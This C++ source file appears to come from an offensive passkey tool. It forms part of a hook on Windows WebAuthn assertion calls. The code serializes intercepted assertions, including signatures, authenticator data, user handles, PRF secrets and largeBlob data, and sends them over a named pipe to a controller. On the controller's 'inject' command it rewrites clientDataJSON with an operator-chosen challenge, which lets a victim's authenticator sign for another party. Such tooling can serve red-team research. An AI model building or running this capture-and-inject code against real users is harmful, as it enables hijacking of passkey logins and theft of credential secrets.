#include "NamedPipe.h"

#if defined(_MSC_VER)
#pragma warning(push, 0)
// Third-party headers trip these MSVC/analyzer diagnostics:
// C4702: unreachable code.
// C6297: 32-bit value is shifted before being cast to a larger type.
// C6319: comma operator in a tested expression ignores the left argument.
// C26495: member variable is not initialized by a constructor or initializer.
// C33010: enum is used as an array index without a lower-bound check.
#pragma warning(disable: 4702 6297 6319 26495 33010)
#endif
#include <cppcodec/base64_url_unpadded.hpp>
#include <rapidjson/document.h>
#include <rapidjson/stream.h>
#include <rapidjson/stringbuffer.h>
#include <rapidjson/writer.h>
#if defined(_MSC_VER)
#pragma warning(pop)
#endif

#include <array>
#include <cstdio>
#include <cstdint>
#include <cstring>
#include <cwchar>
#include <optional>
#include <string>
#include <string_view>

namespace SpecterOps::Passkeys::WebAuthnHook
{
    namespace
    {
        using Base64Url = cppcodec::base64_url_unpadded;
        using JsonWriter = rapidjson::Writer<rapidjson::StringBuffer>;
        constexpr DWORD PipeConnectionRetryDelayMs = 500;

        /// Writes a JSON string value from a string view.
        void WriteString(JsonWriter& writer, const std::string_view value)
        {
            writer.String(
                value.empty() ? "" : value.data(),
                static_cast<rapidjson::SizeType>(value.size()));
        }

        /// Writes a JSON string field.
        void WriteStringField(
            JsonWriter& writer,
            const std::string_view key,
            const std::string_view value)
        {
            writer.Key(
                key.empty() ? "" : key.data(),
                static_cast<rapidjson::SizeType>(key.size()));
            WriteString(writer, value);
        }

        /// Writes a JSON unsigned integer field.
        void WriteUintField(JsonWriter& writer, const std::string_view key, const unsigned value)
        {
            writer.Key(
                key.empty() ? "" : key.data(),
                static_cast<rapidjson::SizeType>(key.size()));
            writer.Uint(value);
        }

        /// Transcodes a UTF-16 string view to UTF-8.
        std::string Utf16ToUtf8(const std::wstring_view wide)
        {
            if (wide.empty())
            {
                return {};
            }

            rapidjson::GenericStringStream<rapidjson::UTF16<wchar_t>> source(wide.data());
            rapidjson::StringBuffer target;

            while (source.Tell() < wide.size())
            {
                if (!rapidjson::Transcoder<rapidjson::UTF16<wchar_t>, rapidjson::UTF8<>>::Transcode(source, target))
                {
                    return {};
                }
            }

            return std::string(target.GetString(), target.GetSize());
        }

        /// Returns the current UTC time formatted as an ISO 8601 timestamp.
        std::string IsoTimestampUtc()
        {
            SYSTEMTIME st{};
            ::GetSystemTime(&st);

            char buf[32]{};
            snprintf(
                buf,
                sizeof(buf),
                "%04u-%02u-%02uT%02u:%02u:%02u.%03uZ",
                st.wYear,
                st.wMonth,
                st.wDay,
                st.wHour,
                st.wMinute,
                st.wSecond,
                st.wMilliseconds);

            return buf;
        }

        /// Converts a hook pipe action enum to its JSON wire-format name.
        std::string_view HookPipeActionJsonName(const HookPipeAction action)
        {
            switch (action)
            {
            case HookPipeAction::Continue: return "continue";
            case HookPipeAction::Capture:  return "capture";
            case HookPipeAction::Inject:   return "inject";
            case HookPipeAction::Wait:     return "wait";
            case HookPipeAction::Unknown:  return "unknown";
            default:                       return "unknown";
            }
        }

        /// Writes an extension output value from the generic WEBAUTHN_EXTENSION wrapper.
        void WriteExtensionValue(
            rapidjson::Writer<rapidjson::StringBuffer>& writer,
            const WEBAUTHN_EXTENSION& extension)
        {
            if (extension.pvExtension == nullptr || extension.cbExtension == 0)
            {
                writer.Null();
                return;
            }

            if (extension.pwszExtensionIdentifier != nullptr
                && wcscmp(extension.pwszExtensionIdentifier, WEBAUTHN_EXTENSIONS_IDENTIFIER_CRED_BLOB) == 0
                && extension.cbExtension == sizeof(WEBAUTHN_CRED_BLOB_EXTENSION))
            {
                const auto* credBlob = static_cast<const WEBAUTHN_CRED_BLOB_EXTENSION*>(extension.pvExtension);
                const std::string value = (credBlob->pbCredBlob != nullptr && credBlob->cbCredBlob > 0)
                    ? Base64Url::encode(credBlob->pbCredBlob, credBlob->cbCredBlob)
                    : std::string{};
                WriteString(writer, value);
                return;
            }

            if (extension.cbExtension == sizeof(BOOL))
            {
                writer.Bool(*static_cast<const BOOL*>(extension.pvExtension) != FALSE);
                return;
            }

            if (extension.cbExtension == sizeof(DWORD))
            {
                writer.Uint(*static_cast<const DWORD*>(extension.pvExtension));
                return;
            }

            const std::string value = Base64Url::encode(
                static_cast<const uint8_t*>(extension.pvExtension),
                extension.cbExtension);
            WriteString(writer, value);
        }

        /// Writes extension outputs carried by WEBAUTHN_ASSERTION::Extensions.
        void WriteExtensionResults(
            rapidjson::Writer<rapidjson::StringBuffer>& writer,
            const WEBAUTHN_EXTENSIONS& extensions)
        {
            if (extensions.pExtensions == nullptr)
            {
                return;
            }

            for (DWORD i = 0; i < extensions.cExtensions; ++i)
            {
                const WEBAUTHN_EXTENSION& extension = extensions.pExtensions[i];
                if (extension.pwszExtensionIdentifier == nullptr)
                {
                    continue;
                }

                const std::string name = Utf16ToUtf8(extension.pwszExtensionIdentifier);
                writer.Key(name.c_str(), static_cast<rapidjson::SizeType>(name.size()));
                WriteExtensionValue(writer, extension);
            }
        }

        /// Writes largeBlob extension output from the assertion struct.
        void WriteLargeBlobResult(
            rapidjson::Writer<rapidjson::StringBuffer>& writer,
            const WEBAUTHN_ASSERTION* assertion)
        {
            if (assertion == nullptr
                || assertion->dwVersion < WEBAUTHN_ASSERTION_VERSION_2
                || (assertion->dwCredLargeBlobStatus == WEBAUTHN_CRED_LARGE_BLOB_STATUS_NONE
                    && (assertion->pbCredLargeBlob == nullptr || assertion->cbCredLargeBlob == 0)))
            {
                return;
            }

            writer.Key("largeBlob");
            writer.StartObject();
            WriteUintField(writer, "status", static_cast<unsigned>(assertion->dwCredLargeBlobStatus));

            if (assertion->pbCredLargeBlob != nullptr && assertion->cbCredLargeBlob > 0)
            {
                const std::string blob = Base64Url::encode(assertion->pbCredLargeBlob, assertion->cbCredLargeBlob);
                WriteStringField(writer, "blob", blob);
            }
            else if (assertion->dwCredLargeBlobStatus != WEBAUTHN_CRED_LARGE_BLOB_STATUS_NONE)
            {
                writer.Key("written");
                writer.Bool(assertion->dwCredLargeBlobStatus == WEBAUTHN_CRED_LARGE_BLOB_STATUS_SUCCESS);
            }

            writer.EndObject();
        }

        /// Writes PRF/HMAC secret extension output from the assertion struct.
        void WritePrfResult(
            rapidjson::Writer<rapidjson::StringBuffer>& writer,
            const WEBAUTHN_ASSERTION* assertion)
        {
            if (assertion == nullptr
                || assertion->dwVersion < WEBAUTHN_ASSERTION_VERSION_3
                || assertion->pHmacSecret == nullptr
                || assertion->pHmacSecret->pbFirst == nullptr
                || assertion->pHmacSecret->cbFirst == 0)
            {
                return;
            }

            writer.Key("prf");
            writer.StartObject();
            writer.Key("results");
            writer.StartObject();

            const std::string first = Base64Url::encode(
                assertion->pHmacSecret->pbFirst,
                assertion->pHmacSecret->cbFirst);
            WriteStringField(writer, "first", first);

            if (assertion->pHmacSecret->pbSecond != nullptr && assertion->pHmacSecret->cbSecond > 0)
            {
                const std::string second = Base64Url::encode(
                    assertion->pHmacSecret->pbSecond,
                    assertion->pHmacSecret->cbSecond);
                WriteStringField(writer, "second", second);
            }

            writer.EndObject();
            writer.EndObject();
        }

        /// Writes raw unsigned extension outputs when Windows exposes their CBOR map.
        void WriteUnsignedExtensionOutputs(
            rapidjson::Writer<rapidjson::StringBuffer>& writer,
            const WEBAUTHN_ASSERTION* assertion)
        {
            if (assertion == nullptr
                || assertion->dwVersion < WEBAUTHN_ASSERTION_VERSION_5
                || assertion->pbUnsignedExtensionOutputs == nullptr
                || assertion->cbUnsignedExtensionOutputs == 0)
            {
                return;
            }

            const std::string value = Base64Url::encode(
                assertion->pbUnsignedExtensionOutputs,
                assertion->cbUnsignedExtensionOutputs);
            WriteStringField(writer, "unsignedExtensionOutputs", value);
        }

        /// Writes client extension results from fields on the native assertion struct.
        void WriteClientExtensionResults(
            rapidjson::Writer<rapidjson::StringBuffer>& writer,
            const WEBAUTHN_ASSERTION* assertion)
        {
            writer.StartObject();

            if (assertion != nullptr && assertion->dwVersion >= WEBAUTHN_ASSERTION_VERSION_2)
            {
                WriteExtensionResults(writer, assertion->Extensions);
            }

            WriteLargeBlobResult(writer, assertion);
            WritePrfResult(writer, assertion);
            WriteUnsignedExtensionOutputs(writer, assertion);

            writer.EndObject();
        }

        /// Writes authenticatorAttachment when the assertion exposes transport data.
        void WriteAuthenticatorAttachment(
            rapidjson::Writer<rapidjson::StringBuffer>& writer,
            const WEBAUTHN_ASSERTION* assertion)
        {
            if (assertion == nullptr
                || assertion->dwVersion < WEBAUTHN_ASSERTION_VERSION_4
                || assertion->dwUsedTransport == 0)
            {
                return;
            }

            std::string_view authenticatorAttachment;
            if ((assertion->dwUsedTransport & WEBAUTHN_CTAP_TRANSPORT_INTERNAL) != 0)
            {
                authenticatorAttachment = "platform";
            }
            else
            {
                constexpr DWORD CrossPlatformTransports =
                    WEBAUTHN_CTAP_TRANSPORT_USB
                    | WEBAUTHN_CTAP_TRANSPORT_NFC
                    | WEBAUTHN_CTAP_TRANSPORT_BLE
                    | WEBAUTHN_CTAP_TRANSPORT_TEST
                    | WEBAUTHN_CTAP_TRANSPORT_HYBRID
                    | WEBAUTHN_CTAP_TRANSPORT_SMART_CARD;

                if ((assertion->dwUsedTransport & CrossPlatformTransports) == 0)
                {
                    return;
                }

                authenticatorAttachment = "cross-platform";
            }

            WriteStringField(writer, "authenticatorAttachment", authenticatorAttachment);
        }

        /// Writes the native assertion fields as a WebAuthn-style JSON response object.
        void WriteAssertionResponse(
            rapidjson::Writer<rapidjson::StringBuffer>& writer,
            const WEBAUTHN_CLIENT_DATA* clientData,
            const WEBAUTHN_ASSERTION* assertion)
        {
            const std::string credentialId = (assertion != nullptr && assertion->Credential.pbId != nullptr && assertion->Credential.cbId > 0)
                ? Base64Url::encode(assertion->Credential.pbId, assertion->Credential.cbId)
                : std::string{};
            const std::string clientDataJson = (clientData != nullptr && clientData->pbClientDataJSON != nullptr && clientData->cbClientDataJSON > 0)
                ? Base64Url::encode(clientData->pbClientDataJSON, clientData->cbClientDataJSON)
                : std::string{};
            const std::string authenticatorData = (assertion != nullptr && assertion->pbAuthenticatorData != nullptr && assertion->cbAuthenticatorData > 0)
                ? Base64Url::encode(assertion->pbAuthenticatorData, assertion->cbAuthenticatorData)
                : std::string{};
            const std::string signature = (assertion != nullptr && assertion->pbSignature != nullptr && assertion->cbSignature > 0)
                ? Base64Url::encode(assertion->pbSignature, assertion->cbSignature)
                : std::string{};
            const std::string userHandle = (assertion != nullptr && assertion->pbUserId != nullptr && assertion->cbUserId > 0)
                ? Base64Url::encode(assertion->pbUserId, assertion->cbUserId)
                : std::string{};

            writer.StartObject();
            WriteStringField(writer, "id", credentialId);
            WriteStringField(writer, "rawId", credentialId);
            WriteStringField(writer, "type", "public-key");
            WriteAuthenticatorAttachment(writer, assertion);
            writer.Key("response");
            writer.StartObject();
            WriteStringField(writer, "clientDataJSON", clientDataJson);
            WriteStringField(writer, "authenticatorData", authenticatorData);
            WriteStringField(writer, "signature", signature);
            writer.Key("userHandle");

            if (assertion == nullptr || assertion->cbUserId == 0 || assertion->pbUserId == nullptr)
            {
                writer.Null();
            }
            else
            {
                WriteString(writer, userHandle);
            }

            writer.EndObject();
            writer.Key("clientExtensionResults");
            WriteClientExtensionResults(writer, assertion);
            writer.EndObject();
        }

        /// Writes the common fields shared by all pipe messages.
        void WriteCommonFields(
            rapidjson::Writer<rapidjson::StringBuffer>& writer,
            const std::string_view type,
            const std::string& timestamp,
            const std::wstring_view processName,
            const std::wstring_view userName,
            const DWORD pid,
            const HookPipeAction previousAction)
        {
            const std::string processNameUtf8 = Utf16ToUtf8(processName);
            const std::string userNameUtf8    = Utf16ToUtf8(userName);

            WriteStringField(writer, "type", type);
            WriteStringField(writer, "timestamp", timestamp);
            WriteUintField(writer, "pid", static_cast<unsigned>(pid));
            WriteStringField(writer, "processName", processNameUtf8);
            WriteStringField(writer, "userName", userNameUtf8);

            if (previousAction != HookPipeAction::Unknown)
            {
                const std::string_view previousActionName = HookPipeActionJsonName(previousAction);
                WriteStringField(writer, "previousAction", previousActionName);
            }
        }
    }

    /// Parses a UTF-8 JSON object into a RapidJSON DOM.
    bool TryParseJsonObject(const std::string_view json, rapidjson::Document& document)
    {
        document.Parse(json.empty() ? "" : json.data(), json.size());
        return !document.HasParseError() && document.IsObject();
    }

    /// Sends a hook pipe message and returns the optional response body.
    std::optional<std::string> SendPipeMessage(const std::string_view message, const DWORD timeoutMs)
    {
        if (message.size() > MAXDWORD)
        {
            return std::nullopt;
        }

        std::array<char, MaxPipeResponseBytes> response{};
        const ULONGLONG startTick = ::GetTickCount64();
        ULONGLONG elapsed = 0;
        DWORD remainingTimeoutMs = timeoutMs;
        DWORD error = ERROR_SUCCESS;

        do
        {
            DWORD bytesRead = 0;
            if (::CallNamedPipeW(
                WebAuthnHookPipeName,
                const_cast<char*>(message.data()),
                static_cast<DWORD>(message.size()),
                response.data(),
                static_cast<DWORD>(response.size()),
                &bytesRead,
                remainingTimeoutMs))
            {
                if (bytesRead == 0)
                {
                    return std::nullopt;
                }

                return std::string(response.data(), bytesRead);
            }

            error = ::GetLastError();
            if (error == ERROR_FILE_NOT_FOUND)
            {
                elapsed = ::GetTickCount64() - startTick;
                remainingTimeoutMs = elapsed < timeoutMs
                    ? static_cast<DWORD>(timeoutMs - elapsed)
                    : 0;
                const DWORD sleepMs = remainingTimeoutMs < PipeConnectionRetryDelayMs
                    ? remainingTimeoutMs
                    : PipeConnectionRetryDelayMs;

                if (sleepMs > 0)
                {
                    ::Sleep(sleepMs);
                }
            }
        }
        while (error == ERROR_FILE_NOT_FOUND && remainingTimeoutMs > 0);

        return std::nullopt;
    }

    /// Parses the requested hook action from a pipe response message.
    HookPipeAction ParsePipeMessageAction(const std::string_view message)
    {
        rapidjson::Document document;
        if (!TryParseJsonObject(message, document))
        {
            return HookPipeAction::Unknown;
        }

        const rapidjson::Value::ConstMemberIterator action = document.FindMember("action");
        if (action == document.MemberEnd() || !action->value.IsString())
        {
            return HookPipeAction::Unknown;
        }

        const std::string_view actionValue(action->value.GetString(), action->value.GetStringLength());
        struct ActionName
        {
            std::string_view name;
            HookPipeAction action;
        };

        constexpr std::array<ActionName, 4> actions{{
            { "continue", HookPipeAction::Continue },
            { "capture",  HookPipeAction::Capture },
            { "inject",   HookPipeAction::Inject },
            { "wait",     HookPipeAction::Wait },
        }};

        for (const ActionName& candidate : actions)
        {
            if (actionValue.size() == candidate.name.size()
                && _strnicmp(actionValue.data(), candidate.name.data(), candidate.name.size()) == 0)
            {
                return candidate.action;
            }
        }

        return HookPipeAction::Unknown;
    }

    /// Builds a replacement clientDataJSON buffer with an injected base64url challenge.
    std::optional<std::string> BuildClientDataJsonWithChallenge(
        const WEBAUTHN_CLIENT_DATA* clientData,
        const std::string_view challenge)
    {
        if (clientData == nullptr
            || clientData->pbClientDataJSON == nullptr
            || clientData->cbClientDataJSON == 0
            || challenge.empty())
        {
            return std::nullopt;
        }

        const std::string_view clientDataJson(
            reinterpret_cast<const char*>(clientData->pbClientDataJSON),
            clientData->cbClientDataJSON);

        rapidjson::Document document;
        if (!TryParseJsonObject(clientDataJson, document))
        {
            return std::nullopt;
        }

        rapidjson::Value::MemberIterator challengeMember = document.FindMember("challenge");
        if (challengeMember == document.MemberEnd() || !challengeMember->value.IsString())
        {
            return std::nullopt;
        }

        challengeMember->value.SetString(
            challenge.empty() ? "" : challenge.data(),
            static_cast<rapidjson::SizeType>(challenge.size()),
            document.GetAllocator());

        rapidjson::StringBuffer buffer;
        rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
        if (!document.Accept(writer))
        {
            return std::nullopt;
        }

        return std::string(buffer.GetString(), buffer.GetSize());
    }

    /// Builds the JSON message sent when a WebAuthn assertion request starts.
    std::string BuildAssertionStartedMessage(
        const std::wstring_view rpId,
        const std::wstring_view processName,
        const std::wstring_view userName,
        const DWORD pid,
        const HookPipeAction previousAction)
    {
        const std::string timestamp   = IsoTimestampUtc();
        const std::string rpIdUtf8    = Utf16ToUtf8(rpId);

        rapidjson::StringBuffer buffer;
        rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
        writer.StartObject();
        WriteCommonFields(writer, "AssertionStarted", timestamp, processName, userName, pid, previousAction);
        WriteStringField(writer, "rpId", rpIdUtf8);
        writer.EndObject();
        return std::string(buffer.GetString(), buffer.GetSize());
    }

    /// Builds the JSON message sent when a WebAuthn assertion request completes successfully.
    std::string BuildAssertionCompletedMessage(
        const std::wstring_view rpId,
        const std::wstring_view processName,
        const std::wstring_view userName,
        const DWORD pid,
        const WEBAUTHN_CLIENT_DATA* clientData,
        const WEBAUTHN_ASSERTION* assertion,
        const HookPipeAction previousAction)
    {
        const std::string timestamp = IsoTimestampUtc();
        const std::string rpIdUtf8 = Utf16ToUtf8(rpId);

        rapidjson::StringBuffer buffer;
        rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
        writer.StartObject();
        WriteCommonFields(writer, "AssertionCompleted", timestamp, processName, userName, pid, previousAction);
        WriteStringField(writer, "rpId", rpIdUtf8);
        writer.Key("payload");
        WriteAssertionResponse(writer, clientData, assertion);
        writer.EndObject();
        return std::string(buffer.GetString(), buffer.GetSize());
    }

    /// Builds the JSON message sent when a WebAuthn assertion request returns an error.
    std::string BuildAssertionErrorMessage(
        const std::wstring_view rpId,
        const std::wstring_view processName,
        const std::wstring_view userName,
        const DWORD pid,
        const HRESULT hresult,
        const HookPipeAction previousAction)
    {
        const std::string timestamp   = IsoTimestampUtc();
        const std::string rpIdUtf8    = Utf16ToUtf8(rpId);

        rapidjson::StringBuffer buffer;
        rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
        writer.StartObject();
        WriteCommonFields(writer, "AssertionError", timestamp, processName, userName, pid, previousAction);
        WriteStringField(writer, "rpId", rpIdUtf8);
        WriteUintField(writer, "hresult", static_cast<unsigned>(static_cast<uint32_t>(hresult)));
        writer.EndObject();
        return std::string(buffer.GetString(), buffer.GetSize());
    }
}
